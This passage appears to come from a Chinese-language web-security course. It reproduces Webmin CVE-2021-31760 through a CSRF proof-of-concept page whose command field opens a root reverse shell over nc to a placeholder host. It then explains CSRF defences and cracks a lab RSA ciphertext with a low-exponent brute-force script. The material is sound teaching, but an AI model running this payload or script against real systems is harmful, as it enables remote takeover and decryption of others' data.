    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$in</span>{<span class="hljs-string">'user'</span>} ne getpwuid($&lt;)) {
        <span class="hljs-variable">$cmd</span> = &amp;command_as_user(<span class="hljs-variable">$in</span>{<span class="hljs-string">'user'</span>}, 0, <span class="hljs-variable">$cmd</span>);
        }
    }

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$in</span>{<span class="hljs-string">'mode'</span>}) {
    <span class="hljs-comment"># fork and run..</span>
    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$pid</span> = fork())) {
        close(STDIN); close(STDOUT); close(STDERR);
        &amp;open_execute_command(PROC, <span class="hljs-string">"(<span class="hljs-variable">$cmd</span>)"</span>, 0);
        <span class="hljs-built_in">print</span> PROC <span class="hljs-variable">$in</span>{<span class="hljs-string">'input'</span>};
        close(PROC);
        <span class="hljs-built_in">exit</span>;
        }
    &amp;redirect(<span class="hljs-string">"index_tree.cgi"</span>);
    }
<span class="hljs-keyword">else</span> {
    <span class="hljs-comment"># run and display output..</span>
    &amp;ui_print_unbuffered_header(undef, <span class="hljs-variable">$text</span>{<span class="hljs-string">'run_title'</span>}, <span class="hljs-string">""</span>);
    <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;p&gt;\n"</span>;
    <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'run_output'</span>, <span class="hljs-string">"&lt;tt&gt;"</span>.&amp;html_escape(<span class="hljs-variable">$in</span>{<span class="hljs-string">'cmd'</span>}).<span class="hljs-string">"&lt;/tt&gt;"</span>),<span class="hljs-string">"&lt;p&gt;\n"</span>;
    <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;pre&gt;"</span>;
    <span class="hljs-variable">$got</span> = &amp;safe_process_exec_logged(<span class="hljs-variable">$cmd</span>, 0, 0,
                     STDOUT, <span class="hljs-variable">$in</span>{<span class="hljs-string">'input'</span>}, 1);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$got</span>) { <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;i&gt;<span class="hljs-variable">$text</span>{'run_none'}&lt;/i&gt;\n"</span>; }
    <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;/pre&gt;\n"</span>;
    &amp;ui_print_footer(<span class="hljs-string">""</span>, <span class="hljs-variable">$text</span>{<span class="hljs-string">'index'</span>});
    }
&amp;webmin_log(<span class="hljs-string">"run"</span>, undef, undef, \%<span class="hljs-keyword">in</span>);
</code></pre>

<p>通过分析源码我们得知代码没有针对CSRF的保护措施，因此我们只需很简单的CSRF构造即可触发该漏洞，并且由于该漏洞触发点是run.cgi文件，我们可以直接通过CSRF构建RCE（远程命令执行），这是非常理想的漏洞利用场景。</p>

<h4 id="漏洞利用">漏洞利用</h4>

<p>接下来我们通过构造PoC，尝试利用这个漏洞。</p>

<p>首先我们来构造一个HTML文件，<strong>这个HTML的核心目标是进行form表单的自动提交</strong>，源码如下：</p>

<pre><code class="language-plain">&lt;html&gt;
        &lt;head&gt;
            &lt;meta name="referrer" content="never"&gt;
        &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="http://your_mituan_app_address/proc/run.cgi" method="POST"&gt;
      &lt;input type="hidden" name="cmd" value="mkfifo /tmp/378; nc your_ip your_port 0&lt;/tmp/378 | /bin/sh &gt;/tmp/378 2&gt;&amp;1; rm /tmp/378" /&gt;
      &lt;input type="hidden" name="mode" value="0" /&gt;
      &lt;input type="hidden" name="user" value="root" /&gt;
      &lt;input type="hidden" name="input" value="" /&gt;
      &lt;input type="hidden" name="undefined" value="" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;

&lt;/html&gt;
</code></pre>

<p><strong>其中主要参数是cmd字段，其含义是：</strong></p>

<ol>
<li>创建一个命名管道378；</li>
<li>Webmin作为客户端使用nc连接黑客控制的服务端，接收命令，并通过匿名管道将命令重定向到bash；</li>
<li>bash执行服务端发过来的命令，将输出重定向到命名管道378，并通过命名管道378将输出重定向到nc发送给服务端。</li>
</ol>

<p>这一条命令实际包含了两条管道，一条匿名管道，一条命名管道，并使其各司其职。它先后将html文件中的your_mituan_app_address、your_ip、your_port替换为谜团启动的应用URL、你的服务器地址、你的服务器IP，即可开始CSRF攻击。</p>

<p>让我们看看这次攻击经历了哪些流程：首先我们以管理员身份登录Webmin界面，在自己的服务器上启动nc进行监听：nc -l -p 1337，然后使用浏览器直接打开我们创建的HTML页面，到这里我们的攻击就已完成，服务器上的nc已经接入Webmin服务器的bash，可以执行任意命令。</p>

<h4 id="漏洞分析">漏洞分析</h4>

<p>既然已经成功利用了该漏洞，接下来我们就要分析这一类漏洞该如何修复。<strong>最简单的方式就是校验这次访问的来源。</strong>事实上，Webmin已经做了这种防御。你肯定会有疑问，为什么做了防御仍然会出现CVE-2021-31760漏洞呢？其实这是由于一个配置项引起的，在构建Webmin平台的过程中，我们对config文件进行了修改：</p>

<pre><code class="language-plain">/etc/webmin/config -&gt; referers_none=0
</code></pre>

<p>在官方的说明中，该项就是在判断不同来源的request能否生效，你可以通过如下命令修改配置并重启Webmin服务：</p>

<pre><code class="language-plain">// 将referers_none=0修改为referers_none=1
vim /etc/webmin/config
// 重启webmin服务
service webmin restart
</code></pre>

<p>再次尝试就会发现该漏洞已经消失了，这也是我在追踪这个漏洞时惊讶的点。也许正是这个原因，截至写稿时，Webmin已经在存在漏洞的版本发布了至少5次更新，但是却并没有修复该漏洞。</p>

<p>到这里你肯定更好奇了，既然Webmin有相关的保护措施，那CVE-2021-31760这个漏洞是否真实存在呢？</p>

<p>这是个好问题，我们继续来深挖一下：</p>

<p>首先，<strong>该配置项是如何生效的？</strong></p>

<p>通过对源码的追踪分析，我们可以发现存在如下函数调用链：</p>

<pre><code class="language-bash hljs"><span class="hljs-comment"># run.cgi</span>
<span class="hljs-comment"># line 5</span>
require <span class="hljs-string">'./proc-lib.pl'</span>;
&amp;ReadParse();
<span class="hljs-variable">$access</span>{<span class="hljs-string">'run'</span>} || &amp;error(<span class="hljs-variable">$text</span>{<span class="hljs-string">'run_ecannot'</span>});
...
<span class="hljs-comment"># proc-lib.pl</span>
<span class="hljs-comment"># line 9</span>
&amp;init_config();
...
<span class="hljs-comment"># web-lib-funcs.pl</span>
<span class="hljs-comment"># line 5142</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$gconfig</span>{<span class="hljs-string">'referers_none'</span>}) {
        <span class="hljs-comment"># Known referers are allowed</span>
        <span class="hljs-variable">$trust</span> = 1;
        }
    elsif (<span class="hljs-variable">$trustvar</span> == 2) {
        <span class="hljs-comment"># Module wants to trust unknown referers</span>
        <span class="hljs-variable">$trust</span> = 1;
        }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$trust</span> = 0;
        }
    }
...
<span class="hljs-comment"># webmin/web-lib-funcs.pl</span>
<span class="hljs-comment"># line 5205</span>
<span class="hljs-comment"># function init_config</span>
...
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$trust</span>) {
    <span class="hljs-comment"># Looks like a link from elsewhere .. show an error</span>
    <span class="hljs-variable">$current_theme</span> = undef;
    &amp;header(<span class="hljs-variable">$text</span>{<span class="hljs-string">'referer_title'</span>}, <span class="hljs-string">""</span>, undef, 0, 1, 1);

    <span class="hljs-variable">$prot</span> = lc(<span class="hljs-variable">$ENV</span>{<span class="hljs-string">'HTTPS'</span>}) eq <span class="hljs-string">'on'</span> ? <span class="hljs-string">"https"</span> : <span class="hljs-string">"http"</span>;
    my <span class="hljs-variable">$url</span> = <span class="hljs-string">"&lt;tt&gt;"</span>.&amp;html_escape(<span class="hljs-string">"<span class="hljs-variable">$prot</span>://<span class="hljs-variable">$ENV</span>{'HTTP_HOST'}<span class="hljs-variable">$ENV</span>{'REQUEST_URI'}"</span>).<span class="hljs-string">"&lt;/tt&gt;"</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$referer_site</span>) {
        <span class="hljs-comment"># From a known host</span>
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_warn'</span>,
                <span class="hljs-string">"&lt;tt&gt;"</span>.&amp;html_escape(<span class="hljs-variable">$r</span>).<span class="hljs-string">"&lt;/tt&gt;"</span>, <span class="hljs-variable">$url</span>);
        <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;p&gt;\n"</span>;
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_fix1'</span>, &amp;html_escape(<span class="hljs-variable">$http_host</span>)),<span class="hljs-string">"&lt;p&gt;\n"</span>;
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_fix2'</span>, &amp;html_escape(<span class="hljs-variable">$http_host</span>)),<span class="hljs-string">"&lt;p&gt;\n"</span>;
        }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment"># No referer info given</span>
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_warn_unknown'</span>, <span class="hljs-variable">$url</span>),<span class="hljs-string">"&lt;p&gt;\n"</span>;
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_fix3u'</span>),<span class="hljs-string">"&lt;p&gt;\n"</span>;
        <span class="hljs-built_in">print</span> &amp;text(<span class="hljs-string">'referer_fix2u'</span>),<span class="hljs-string">"&lt;p&gt;\n"</span>;
        }
    <span class="hljs-built_in">print</span> <span class="hljs-string">"&lt;p&gt;\n"</span>;

    &amp;footer();
    <span class="hljs-built_in">exit</span>;
    }
...
</code></pre>

<p>至此，我们发现referers_none配置项的启用，可以影响到run.cgi的工作流程，使其对于包含不同referers的http request继续提供支持。</p>

<p>是否该项配置项就足够了呢？其实答案是否定的，因为CSRF漏洞一般发生在跨域场景，但是这句话并不绝对，对于同域场景发生的CSRF攻击，上述配置项是难以抵御的。虽然同域场景对攻击者的能力有更高的要求，但是一旦问题发生，我们可以看到root权限级别的RCE仍然是非常恐怖的。</p>

<p>那么如何从开源代码中学习漏洞挖掘以及安全开发呢？授人以鱼不如授人以渔，<strong>这个漏洞的学习除了本身的知识点，更重要的是如何通过对一个CVE漏洞的分析，去掌握漏洞分析和修复的规律。</strong></p>

<p>在分析一个漏洞时，一定要分析清楚函数调用关系，清晰地了解输入是经过怎样的过程最终影响到输出的。然后一个有质量的漏洞，产品团队一般会在漏洞公布的第一时间进行修复，我们可以使用GitHub的版本比对功能，拿漏洞出现的版本与修复后版本进行源码比对，通过这样的方式可以帮助我们了解优秀的项目是如何解决同类安全问题的。</p>

<p>通过这种方式，我们可以学习到很多优秀宝贵的经验，快速提升我们的开发水平。</p>

<h2 id="防御及检测">防御及检测</h2>

<p>根据CSRF的攻击特点，我们可以采用以下几种方式进行防御：</p>

<p><strong>1. 同源策略</strong></p>

<p>该防御策略的产生主要为了针对CSRF攻击的第一个特征——跨域场景，它的设计思路主要是禁止外域（或者不受信任的域名）对Web Server发起请求。在HTTP协议中，有两个Header字段可以用来帮助我们判断来源域：Origin Header 和 Referer Header。这两个字段在浏览器发送请求时会自动携带，并且<strong>不能由前端修改</strong>。</p>

<p>你可能会有疑问：这两个字段很明显是依赖于浏览器实现的，现在浏览器种类那么多，如果浏览器不支持怎么办？必须承认，这是个很好的问题，HTTP协议标准本身在动态更新，很多比较旧版本的浏览器可能不支持这个Policy，如果出现这种情况最好的策略就是阻止这次请求。</p>

<p><strong>2. Token</strong></p>

<p>回顾我们在总结CSRF特点时提到的特征，CSRF一般发生在跨域场景下，但是并不绝对。如果攻击者是在本域发起的CSRF攻击，那么同源策略就会失效，因此我们需要一种更严格的防护策略——CSRF Token。</p>

<p>那么CSRF Token如何实现呢？为每一个form表单生成唯一的token，并且在form提交时验证token，就是CSRF Token的实现思路，但是token需要保证不可预测。在代码实现上主要有2种思路。</p>

<p>第一种是在用户访问页面时，由服务器生成Token，将生成的Token存放于Session中，一般Token生成时会通过加密算法实现，输入一般包括随机字符串、时间戳等，要注意Token也会有有效期。</p>

<p>第二种是每次加载页面时通过JS遍历DOM树结构插入Token：</p>

<pre><code class="language-plain">GET: http://example.com?csrf_token=value
POST: &lt;input type = "hidden" name = "csrf_token" value = "value"/&gt;
</code></pre>

<p>了解了客户端实现之后，你肯定自然地想到了后面的问题——服务端收到HTTP请求后怎么验证token的正确性呢？</p>

<p>要注意，对于分布式Web应用，使用Session存储Token会非常不方便，所以一般采用中间件存储或者动态计算的方式来优化。中间件存储方案是将Token存储在Redis中间件上，这样可以保证不同服务器取得的token值一致；动态计算方案是Token的原始输入不再采用随机数，而是采用UID等用户信息，同时加密算法采用对称加密算法，这样可以保证任何一台分布式服务器取到Token后都可以执行解密操作并进行数据正确性比对。</p>

<p><strong>3. 接口设计</strong></p>

<p>对于同源策略的实现，是有一些特殊的场景需要被作为例外处理的。按照我们之前的设计，用户来自搜索引擎链接的跳转会被无差异判定为CSRF攻击，这时我们就要判断特定情况并进行放行处理，一般情况下我们都会放行GET请求。但此时如果Web应用实现上允许用户通过GET请求发送敏感操作，就会出现安全问题。这提醒我们，不要在GET请求中允许用户执行敏感操作。</p>

<p>这里我们可以引入一个更形象的、非技术手段的抵制CSRF的案例——人工形态的CSRF_Token，在许多重要的支付环节，都需要在最后一步发送手机验证码、邮件验证码或者进行人脸识别，其实这就是通过应用流程设计的角度实现的一种CSRF_Token变种验证操作。</p>

<p>现在的防御方案，主要考虑的是如何防止跨域的CSRF。因为攻击者无法获取到Token，所以大家会普遍认为，本域发生的CSRF暂时是安全的。但是，如果XSS和CSRF问题同时在本域发生，由于XSS可以让攻击者获取Token，CSRF的防御就宣告失效。因此我们需要在Web应用设计和开发过程中，严格过滤用户的输入，确保用户不能够输入我们不希望出现的内容，这样可以同时规避掉XSS和CSRF安全风险。</p>

<p><strong>4. 双重Cookie</strong></p>

<p>在Web应用开发中新增CSRF_Token机制还是稍有些麻烦，那么我们该如何通过现有的组件，来实现CSRF防御方案呢？答案是双重Cookie。</p>

<p>当用户访问Web网站时，Web应用为用户随机生成一个新的Cookie值，当Web应用每次执行表单提交操作时都需要携带这个Cookie值；由于同源策略的保护，攻击者无法获取或者修改这个Cookie项，因此实现了CSRF的保护。</p>

<p>但要注意的是这项技术需要用到JavaScript，因此在一些JavaScript Disabled的浏览器中是无法工作的。</p>

<p>除此以外，双重Cookie也面临一些风险。比如本域Web应用存在XSS漏洞，该防御将失效。以及为了确保Cookie传输安全，需要采用整站HTTPS，否则Cookie泄露也会导致该防御失效。</p>

<h2 id="总结">总结</h2>

<p>这节课我们探讨了一类主流的安全风险——CSRF，首先我们列出了CSRF风险的常见特征：首先，由于外域更容易被攻击者控制，攻击一般发生在跨域场景下；其次，CSRF在攻击过程中并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；最后，攻击者可以采用图片URL、超链接、表单提交等许多方式实现攻击。</p>

<p>然后我们以2021年上半年的一个CSRF RCE漏洞为例，对它进行了实例分析，这个过程中我们首先完成了对CVE-2021-31760漏洞的复现，并针对该漏洞修复方案进行评估，然后又通过这个漏洞，学习了漏洞挖掘、漏洞分析以及漏洞修复方法。</p>

<p>最后我们给出了一些业内普遍认可的，新颖的解决方案，供你在工作中使用，他们分别是：同源策略、CSRF Token、接口设计层保护、双重Cookie和Samesite Cookie</p>

<p>以上，就是关于CSRF我们一起学习探讨的内容，欢迎大家在评论区留言讨论。什么？你说Samesite Cookie没讲？那就作为课后作业吧！</p>

<h2 id="思考题">思考题</h2>

<p>为了防御CSRF，除了上述安全方案，业内提出了一种新的解决方案——Samesite Cookie，你可以通过自己的研究，讲讲它和双重Cookie的区别吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见！</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="06 加密失败：使用了加密算法也会被破解吗？" class="title">06 加密失败：使用了加密算法也会被破解吗？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>从这节课开始我们开启了新的模块——加密失败的学习。这是2021 OWASP TOP 10的排名第二的风险种类，与失效的访问控制相比，<strong>加密失败更多地体现为一种单点技术问题，通常是由于开发人员对加密过程使用不合理造成的</strong>。</p>

<p>先来分享一个我的小故事：</p>

<p>作为一个Dota 2玩家，我有一台自己的Windows台式机，配置是i7-4790k + 16GB内存 + 256GB SSD。相信你能看出来，虽然这台机器在当时也算小“高端”配置，但到现在已经稍微有点力不从心了。</p>

<p>于是我便产生了更新硬件的想法——经过多次测试，我觉得性能下降的主要问题在于CPU温度，这一想法在我百度了“4790k 散热”之后更加坚定，于是我决定用水冷取代原来CPU自带的小风扇。在某东购置了水冷设备后，经过简单的安装，顺利开机。令人惊讶的一幕出现了：原来开机之后CPU温度是70℃，现在是99℃，由于温度过高开机不到20分钟就会自动关机。</p>

<p>为什么水冷会比风冷效果还差呢？是不是水冷设备没有工作？但我是按照说明书安装的，看起来呼吸灯也是亮的。看着一体化的水冷设备，没有任何有效的判断方式，我的内心是崩溃的。经过接近半天时间的不断调试和开机测试，最终我找到了问题——螺丝没有拧紧导致接触不严密，散热效果没有发挥出来。</p>

<p>分享这个故事，我是想说的是，<strong>在面对一个我们完全不了解的黑盒产品时，使用过程中出问题的可能性是很大的，加密失败这种安全风险往往就因此产生</strong>。</p>

<p>加密是一个数学问题，应用到了开发场景。事实上，加密函数就像一个黑盒，开发人员能够考虑的只有输入和输出，其中输出还是非常复杂的。加密是否成功，极大地影响着系统的安全性，但是很多开发人员，对加密却没有深入研究。因此，<strong>只验证加密结果的正确性，却不验证加密结果的质量是不行的</strong>。接下来的几节课我们会重点讨论加密结果的质量问题。</p>

<h2 id="加密失败">加密失败</h2>

<p>在国内的信息安全建设大背景下，系统的数据安全已经愈加重要，其中首先要考虑的就是数据的传输层和存储层的安全。这些环节中主要采用的保护方案就是加密，目前加密已经渗透到了开发的方方面面。也许这样描述你没有直观的感受，那么我们来看一些场景：</p>

<ul>
<li>目前数据是否是通过明文进行传输的？</li>
<li>目前业务系统中是否存在旧版本或者强度比较低的加密函数？</li>
<li>服务器上的证书是否合法有效，证书信任链是否完整？</li>
<li>加密函数的初始化序列是否被合理使用？是否使用了不安全的加密操作，比如ECB？</li>
<li>随机数是否得到了合理的初始化，以及是否使用了硬编码种子？</li>
<li>加密错误信息或者侧信道信息是否导致密码可破解？</li>
</ul>

<p>以上这些只是部分场景，可以看到，加密正在成为系统开发不可分割的一部分，那么接下来，我们来就了解一些典型的攻击场景：</p>

<p><strong>1. 数据库加密</strong>-
以MySQL为例，数据库可以通过其内部加密函数实现数据加密存储，然而在数据读取过程中由于经过自动解密过程，SQL注入这样的攻击就有可能获取到数据库中的明文。</p>

<p><strong>2. 数据明文传输</strong>-
以在企业内网搭建的系统为例，由于许多系统并未强制要求TLS，因此，如果攻击者可以监控内网流量，则有可能窃取到网络传输的敏感数据，包括登录凭据等。事实上，目前攻击者入侵内网设备的情况是很多见的，无论是通过脆弱的边界路由设备，或是经过存在漏洞的无线网络设备，以及通过鱼叉式网络钓鱼，攻击者一旦穿越企业的网络防御边界，便可通过嗅探、ARP欺骗等方式窃取网络数据，进而在内网横向移动。</p>

<p><strong>3. 加密强度不够</strong>-
在一些数据存储或者传输过程中，开发者在实现数据加密过程中仅仅“走流程”地进行了加密操作，然而如此加密的强度并不足以抵御攻击者的破解。</p>

<p><strong>4. 弱HASH</strong>-
在使用特定算法生成HASH结果的时候，如果HASH算法因为设计的缺陷，不能满足安全性需求，导致攻击者能够判断出原始输入，这是原像攻击（preimage attack）；如果攻击者能够找到其他输入，并且生成同样的HASH输出，这是第二原像攻击（2nd preimage attack）；如果攻击者能够找到多个输入，并且生成同样的HASH输出，这是生日攻击（birthday attack）。</p>

<p><strong>5. 签名验证不当</strong>-
在数据传输过程中，通信协议中会涉及数据段的签名，以此来保证数据的完整性和不可篡改性。在实际数据交互中，有时可能由于签名未认证，有时可能仅验证了签名的有效性，但并没有重新从数据段计算签名进行比对，这些问题都可能导致攻击者执行绕过。</p>

<h2 id="rsa-低加密指数攻击">RSA - 低加密指数攻击</h2>

<h4 id="rsa算法">RSA算法</h4>

<p>在了解这种攻击类型之前，我们要先了解RSA算法，这是目前应用最广泛的非对称加密算法之一。</p>

<p>我们首先看公式。</p>

<blockquote>
<p>plain_text = 明文，cipher_text = 密文，(n,e) = 公钥，(n,d) = 私钥-
加密过程：plain_text ^ e ≡ cipher_text (mod n)-
解密过程：cipher_text ^d ≡ plain_text (mod n)</p>
</blockquote>

<p>对于低加密指数攻击，我们已知条件是：</p>

<ul>
<li>密文：cipher_text；</li>
<li>公钥：(n,e)。</li>
</ul>

<p>我们的任务是根据已知条件获取明文（plain_text）。</p>

<p>作为攻击者，无论是我们是要尝试挖掘Web系统、二进制应用还是区块链系统或者是其他程序漏洞，都需要具备两点前提。一方面，<strong>你需要判断漏洞是否存在</strong>，这需要你熟悉目标系统的开发与设计过程，深刻理解特定功能的最佳实践。另一方面，<strong>你需要降低攻击向量空间</strong>，这就要求你足够了解目标系统的执行逻辑，在此基础上有目的地缩小测试范围。</p>

<p>对于低加密指数攻击案例而言，如果不理解RSA算法加密过程，我们就无法判断漏洞是否存在，这是漏洞挖掘黄金法则第一条；而执行数学变换进行判断的过程，就是在有效地缩小测试范围，降低攻击向量空间，这是漏洞挖掘法则第二条。这两条适用于许多漏洞挖掘场景。</p>

<p>因此这里我们要先了解RSA原理，以及在应用RSA算法过程中的最佳实践，以此来判断特定场景是否存在漏洞。</p>

<h4 id="rsa算法工作过程">RSA算法工作过程</h4>

<p>想象一个这样的场景——数学家小明有一段关键的信息，希望加密后发给历史学家小密。</p>

<p>经过商议，小明选择RSA算法加密传递，但是由于小明科研经费紧张，买不起电脑，于是通过手动计算的方式来执行RSA算法。这里<strong>小明的主要目标是计算出RSA算法的关键参数——n、e、d</strong>，我们看看他需要经历哪些步骤。</p>

<p>第一步，小明首先随机选择了两个不相等质数（prime number），p1和p2；p1 = 23，p2 = 71（实际应用中p1和p2越大，破解难度就越高）。</p>

<p>第二步，小明通过计算p1和p2的乘积，这里得到了第一个关键参数n； n = p1 x p2 = 1633，这里n转换为2进制的长度就是我们通常意义上描述的密钥长度。</p>

<p>第三步，小明需要获得第二个关键参数e： φ(n) = (p1-1) x (p2-1) = 1540，在1~φ(n)之间随机选取一个整数使其与φ(n)互质，即得到第二个关键参数e，e = 19。</p>

<p>第四步，他可以通过模逆元计算得出三个关键参数d，需要满足的条件是 e x d ≡ 1 (mod φ(n))。</p>

<p><strong>现在，小明已经获得所有关键参数，他此时只需要将p1、p2销毁，自己留存(n,d)组成的私钥，并将(n,e)组成的公钥发给小密即可 。</strong></p>

<p>这里我们来分析一下RSA算法的安全性，由于公钥信息是公开的，因此我们可以认为n和e是已知的，那么是否存在一种可能性是在已知n与e的情况下推导出d呢？这里我们首先要分析d的计算过程：</p>

<ol>
<li>根据RSA算法工作过程的第四步，我们可以知道e与φ(n)是计算出d的前提，e是已知的；</li>
<li>根据RSA算法工作过程的第三步，我们可以知道p1与p2是计算出φ(n)的前提，而n = p1 x p2；</li>
<li>那么私钥安全性就依赖于n因数分解的难度。目前，数学界对于大整数因数分解并没有很好的解决方案，因此RSA的安全性得以保证。</li>
</ol>

<h2 id="案例实战">案例实战</h2>

<p>接下来我们进入实战环节。登录谜团（<a href="http://mituan.zone" target="_blank">mituan.zone</a>）并选择【RSA - 低加密指数攻击】环境，启动后可以在home目录找到flag.enc以及pubkey.pem两个文件。</p>

<pre><code class="language-bash hljs">total 16
-rw-rw-r--@ 1 hunter  staff  512  6  2  2019 flag.enc
-rw-rw-r--@ 1 hunter  staff  796  6  2  2019 pubkey.pem
</code></pre>

<p>通过调用OpenSSL对pubkey.pem进行解析：</p>

<pre><code class="language-bash hljs">openssl rsa -pubin -text -modulus -<span class="hljs-keyword">in</span> pubkey.pem
Public-Key: (4096 bit)
...
Exponent: 3 (0x3)
Modulus=B0BEE5E3E9...
...
</code></pre>

<p>可以得到n和e，其中n = Modulus、e = Exponent，这里我们将数值带入后，再看一下加密公式：</p>

<pre><code class="language-plain">plain_text ^ e ≡ cipher_text (mod n)
其中e、n、cipher_text均是已知的，进行一下简单的格式变换可以得出
plain_text = (kn + (cipher_text mod n)) ^ 1/3
</code></pre>

<p>有趣的事情出现了，在e数值很小的情况下，我们是可以尝试暴力破解的。</p>

<p>接下来我们通过代码来实现暴力破解明文：</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">import</span> os, time
<span class="hljs-keyword">import</span> gmpy2

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    start_time = <span class="hljs-number">0</span>
    c_time = <span class="hljs-number">0</span>

    n = <span class="hljs-number">721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241</span>

    k = <span class="hljs-number">0</span>

    c_path = os.getcwd()
    fname = c_path + <span class="hljs-string">"/flag.enc"</span>

    <span class="hljs-built_in">print</span>(fname)

    f = <span class="hljs-built_in">open</span>(fname, <span class="hljs-string">'rb'</span>)
    c = f.read()
    c_num = <span class="hljs-built_in">int</span>.from_bytes(c, byteorder=<span class="hljs-string">'big'</span>)

    mod_num = c_num % n

    <span class="hljs-built_in">print</span>(<span class="hljs-string">'n = '</span> + <span class="hljs-built_in">str</span>(n))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'mod = '</span> + <span class="hljs-built_in">str</span>(mod_num))

    start_time = <span class="hljs-built_in">int</span>(time.time())

    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:

        c_time = <span class="hljs-built_in">int</span>(time.time())
        time_pass = c_time-start_time
        <span class="hljs-keyword">if</span> (c_time - start_time) == <span class="hljs-number">10</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"current k: "</span> + <span class="hljs-built_in">str</span>(k))
            start_time = c_time

        y = k * n + mod_num
        root_num, status = gmpy2.iroot(y,<span class="hljs-number">3</span>)

        <span class="hljs-keyword">if</span> status == <span class="hljs-number">1</span>:
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">else</span>:
            k = k + <span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'plain_text = '</span> + <span class="hljs-built_in">str</span>(root_num))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>

<p>通过约300s的程序运行时间，在输出中可以获得plain_text的值：</p>

<pre><code class="language-plain">plain_text = 440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186
</code></pre>

<p>再通过代码将plain_text值转换为字符：</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    plain_text = <span class="hljs-number">440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186</span>

    plain_text_in_char = []

    <span class="hljs-keyword">while</span> plain_text != <span class="hljs-number">0</span>:
        plain_text, c = <span class="hljs-built_in">divmod</span>(plain_text, <span class="hljs-number">256</span>)
        plain_text_in_char.append(<span class="hljs-built_in">chr</span>(c))

    plain_text_in_char.reverse()

    <span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join(plain_text_in_char))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>

<p>运行上述代码，可以得到如下输出：</p>

<pre><code class="language-plain">Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: PCTF{Sm4ll_3xpon3nt_i5_W3ak}
</code></pre>

<p><strong>可以看到我们已经成功破解了RSA加密，获取到了明文，即plain_text。</strong></p>

<p>这里补充一个有趣的知识点，RSA属于块加密算法，与之相对应的是流加密。块加密是有一个padding机制的，正如输出结果中所述，这里能够破解成功的另一个主要原因是明文并没有采用padding来补齐块长度，如果明文的长度足够长，就会使得暴力破解的所需时间快速攀升，进而更有效地抵御攻击。</p>

<h2 id="总结">总结</h2>

<p>这节课我们首先探讨了在产品开发过程中涉及加密算法的一些常见问题，并列举了一些典型的攻击场景。</p>

<p>接下来的实战案例环节，我们通过RSA算法的低加密指数攻击案例，学习了RSA加密算法的原理，在此基础上我们成功对一段RSA加密结果进行了攻击。通过这个实例可以发现即使是全球闻名的RSA算法，如果使用方式不当，也存在被破解的可能性。</p>

